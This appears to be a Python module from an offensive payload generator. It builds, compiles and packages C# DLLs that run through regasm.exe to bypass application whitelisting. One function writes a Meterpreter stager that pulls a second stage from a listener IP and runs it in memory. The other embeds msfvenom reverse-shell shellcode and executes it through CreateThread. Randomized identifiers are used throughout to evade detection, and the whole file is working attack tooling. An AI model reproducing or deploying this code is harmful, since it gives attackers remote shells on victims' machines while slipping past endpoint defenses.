#! /usr/bin/env python3
import os
import base64
import subprocess
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()

##  RegAsm
def gen_430():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are setting up RegAsm payloads  NOW!" + m.bcolors.ENDC)

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating  RegAsm MET DLL file...")
  classhellcodeName = m.randomString(8)
  classhellcodeNameTwo = m.randomString()
  namespace = m.randomString(13)
  key = m.randomString()
  injectName = m.randomString(10)
  execName = m.randomString(11)
  bytearrayName = m.randomString(9)
  funcAddrName = m.randomString(8)
  savedStateName = m.randomString(7)
  shellcodeName = m.randomString(12)
  rand_bool = m.randomString(11)
  random_out = m.randomString(9)
  getDataName = m.randomString(8)
  hThreadName = m.randomString(10)
  threadIdName = m.randomString()
  pinfoName = m.randomString(8)
  cwname = m.randomString()

  y = [m.randomString(9) for x in range(17)]

  asmmet = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.EnterpriseServices; using System.Windows.Forms;\n"
  asmmet += "namespace {0}\n {{".format(namespace)
  asmmet += "\n\tpublic class {0} : ServicedComponent {{\n".format(classhellcodeName)
  asmmet += '\n\t\tpublic {0}() {{ Console.WriteLine("{1}"); }}\n'.format(classhellcodeName, cwname)
  asmmet += "\n\t\t[ComRegisterFunction]"
  asmmet += "\n\t\tpublic static void RegisterClass ( string {0} )\n\t\t{{\n".format(key)
  asmmet += "\t\t\t{0}.{1}();\n\t\t}}\n".format(classhellcodeNameTwo, execName)
  asmmet += "\n[ComUnregisterFunction]"
  asmmet += "\n\t\tpublic static void UnRegisterClass ( string {0} )\n\t\t{{\n".format(key)
  asmmet += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classhellcodeNameTwo, execName)
  asmmet += "\n\tpublic class {0}\n\t{{".format(classhellcodeNameTwo)
  asmmet += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])

  hostName = m.randomString(9)
  portName = m.randomString(10)
  ipName = m.randomString()
  sockName = m.randomString(8)
  length_rawName = m.randomString(11)
  lengthName = m.randomString()
  sName = m.randomString(13)
  total_bytesName = m.randomString(9)
  handleName = m.randomString(8)

  asmmet += "static byte[] %s(string %s, int %s) {\n" %(getDataName, hostName, portName)
  asmmet += "    IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s), %s);\n" %(ipName, hostName, portName)
  asmmet += "    Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
  asmmet += "    try { %s.Connect(%s); }\n" %(sockName, ipName)
  asmmet += "    catch { return null;}\n"
  asmmet += "    byte[] %s = new byte[4];\n" %(length_rawName)
  asmmet += "    %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
  asmmet += "    int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
  asmmet += "    byte[] %s = new byte[%s + 5];\n" %(sName, lengthName)
  asmmet += "    int %s = 0;\n" %(total_bytesName)
  asmmet += "    while (%s < %s)\n" %(total_bytesName, lengthName)
  asmmet += "    { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
  asmmet += "    byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
  asmmet += "    Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
  asmmet += "    return %s;}\n" %(sName)
  asmmet += "static void %s(byte[] %s) {\n" %(injectName, shellcodeName)
  asmmet += "    if (%s != null) {\n" %(shellcodeName)
  asmmet += '       UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(pinfoName, shellcodeName)
  asmmet += '       UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(funcAddrName, pinfoName, shellcodeName)
  asmmet += '       RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(funcAddrName, shellcodeName, shellcodeName)
  asmmet += '       UInt32 {} = 0;\n'.format(threadIdName)
  asmmet += '       IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, funcAddrName, threadIdName)
  asmmet += '       WaitForSingleObject({}, 0xFFFFFFFF);}}}}\n'.format(hThreadName)
  asmmet += "\n\t\tpublic static void {0}() {{\n".format(execName)
  asmmet += "    byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName, sName, getDataName, m.listener_ip, m.METRT32_PORT)
  asmmet += "    %s(%s);\n" %(injectName, sName)
  asmmet += "                        }\n"
  asmmet += "               }\n"
  asmmet += "       }\n"

  asmmet_cs_file = open(m.targetfile + "430-RegAsm-MET.cs", "w")
  asmmet_cs_file.write(asmmet)
  asmmet_cs_file.close()

  os.system("mcs -platform:x86 -target:library -r:System.EnterpriseServices,System.Windows.Forms " + m.targetfile + "430-RegAsm-MET.cs  -out:" + m.targetfile +"430-Regasm-Met.dll")

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit RegAsm MET BAT file...")
  asmmet_bat_file = open(m.targetfile + "431-RegAsm-MET.bat", "w")
  asmmet_bat_file.write(r"cmd /k C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U 430-Regasm-Met.dll")
  asmmet_bat_file.close()

def gen_431():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating Shell  RegAsm payloads  NOW!" + m.bcolors.ENDC)

  shellcode = subprocess.check_output("msfvenom -p {0} LHOST={1} LPORT={2} -f c | tr -d \'\"\' | tr -d \'\n\'".format(m.SHELL32_Payload, m.listener_ip, m.SHELL32_PORT), shell=True)
  shellcode = shellcode.decode('ascii')
  Shellcode = base64.b64encode(bytes(shellcode, 'latin-1')).decode('ascii')

  className = m.randomString(10)
  classNameTwo = m.randomString(9)
  namespace = m.randomString(8)
  key = m.randomString()
  execName = m.randomString(11)
  bytearrayName = m.randomString(12)
  funcAddrName = m.randomString(8)
  savedStateName = m.randomString(9)
  messWithAnalystName = m.randomString(7)
  shellcodeName = m.randomString()
  rand_bool = m.randomString(10)
  random_out = m.randomString(8)
  hThreadName = m.randomString(7)
  threadIdName = m.randomString(9)
  pinfoName = m.randomString(12)
  cwname = m.randomString()

  y = [m.randomString(10) for x in range(17)]

  ashell = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.EnterpriseServices; using System.Windows.Forms;\n"
  ashell += "namespace {0}\n {{".format(namespace)
  ashell += "\n\tpublic class {0} : ServicedComponent {{\n".format(className)
  ashell += '\n\t\tpublic {0}() {{ Console.WriteLine("{1}"); }}\n'.format(className, cwname)
  ashell += "\n\t\t[ComRegisterFunction]"
  ashell += "\n\t\tpublic static void RegisterClass ( string {0} )\n\t\t{{\n".format(key)
  ashell += "\t\t\t{0}.{1}();\n\t\t}}\n".format(classNameTwo, execName)
  ashell += "\n[ComUnregisterFunction]"
  ashell += "\n\t\tpublic static void UnRegisterClass ( string {0} )\n\t\t{{\n".format(key)
  ashell += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classNameTwo, execName)
  ashell += "\n\tpublic class {0}\n\t{{".format(classNameTwo)
  ashell += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])
  ashell += "\n\t\tpublic static void {0}() {{\n".format(execName)
  ashell += "\t\t\tstring %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(\"%s\"));\n" % (bytearrayName, Shellcode)
  ashell += "\t\t\tstring[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
  ashell += "\t\t\tbyte[] %s = new byte[chars.Length];\n" %(shellcodeName)
  ashell += "\t\t\tfor (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n"  %(shellcodeName)

  rand_heap = m.randomString(9)
  rand_ptr = m.randomString()
  rand_var = m.randomString(8)

  ashell += '\t\t\tUInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(rand_heap, shellcodeName)
  ashell += '\t\t\tUInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(rand_ptr, rand_heap, shellcodeName)
  ashell += '\t\t\tRtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(rand_ptr, shellcodeName, shellcodeName)
  ashell += '\t\t\tUInt32 {} = 0;\n'.format(rand_var)
  ashell += '\t\t\tIntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, rand_ptr, rand_var)
  ashell += '\t\t\tWaitForSingleObject({}, 0xFFFFFFFF);\n'.format(hThreadName)
  ashell += "                        }\n"
  ashell += "               }\n"
  ashell += "       }\n"


  ashell_cs_file = open(m.targetfile + "432-RegAsm-Shell.cs", "w")
  ashell_cs_file.write(ashell)
  ashell_cs_file.close()

  os.system("mcs -platform:x86 -target:library -r:System.EnterpriseServices,System.Windows.Forms " + m.targetfile + "432-RegAsm-Shell.cs  -out:" + m.targetfile +"432-Regasm-Shell.dll")

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit  RegAsm Shell BAT file...")
  asmmet_bat_file = open(m.targetfile + "433-RegAsm-Shell.bat", "w")
  asmmet_bat_file.write(r"cmd /k C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U 432-Regasm-Shell.dll")
  asmmet_bat_file.close()
